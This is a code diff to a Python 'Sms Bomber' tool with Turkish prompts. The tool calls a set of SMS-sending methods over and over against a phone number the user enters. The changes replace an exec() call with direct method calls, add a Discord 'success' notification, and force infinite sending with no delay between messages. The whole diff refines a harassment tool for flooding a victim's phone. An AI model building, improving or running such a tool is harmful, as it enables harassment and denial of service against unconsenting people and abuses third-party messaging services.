@@ -12,7 +12,7 @@ banner = f"""
 {Fore.RED}|  __|  {Fore.GREEN}|  __|  {Fore.BLUE}|  _  /  {Fore.YELLOW}   | |  {Fore.MAGENTA}    | |   {Style.RESET_ALL}
 {Fore.RED}| |     {Fore.GREEN}| |____ {Fore.BLUE}| | \ \   {Fore.YELLOW} _| |_  {Fore.MAGENTA}   | |   {Style.RESET_ALL}
 {Fore.RED}|_|     {Fore.GREEN}|______|{Fore.BLUE}|_|  \_\  {Fore.YELLOW}\_____|{Fore.MAGENTA}    |_|   {Style.RESET_ALL}
-{Fore.RED}{" " * 50}by @ferit22901{Style.RESET_ALL}
+{Fore.RED}{" " * 40}by @ferit22901{Style.RESET_ALL}
 {Fore.LIGHTMAGENTA_EX}Sms Bomber :){Style.RESET_ALL}
 
 """
@@ -23,7 +23,11 @@ def send_sms_to_number(telefon, mail, kere, aralik):
         for attribute in dir(sms):
             attribute_value = getattr(sms, attribute)
             if callable(attribute_value) and not attribute.startswith('__'):
-                exec("sms." + attribute + "()")
+                if attribute == 'send_discord_notification':
+                    # `send_discord_notification` işlevini doğru parametrelerle çağırın.
+                    sms.send_discord_notification("Test Service", telefon, "Başarılı", "Başarılı bir şekilde SMS gönderildi.")
+                else:
+                    attribute_value()
                 time.sleep(aralik)
         if kere != float('inf'):
             kere -= 1
@@ -48,8 +52,7 @@ def main():
                 telefon = input(f"{Fore.LIGHTGREEN_EX}SMS göndermek istediğiniz numarayı girin: {Style.RESET_ALL}")
                 mail = ""
                 system("cls||clear")
-                kere = input(f"{Fore.LIGHTGREEN_EX}Kaç kere göndermek istediğinizi girin (boş bırakın: sonsuz): {Style.RESET_ALL}")
-                kere = float('inf') if not kere else int(kere)
+                kere = float('inf')  # Sonsuz gönderim
                 aralik = 0
                 system("cls||clear")
                 send_sms_to_number(telefon, mail, kere, aralik)
@@ -70,7 +73,7 @@ def main():
                     continue
                 mail = ""
                 system("cls||clear")
-                kere = float('inf')
+                kere = float('inf')  # Sonsuz gönderim
                 aralik = 0
                 system("cls||clear")
 
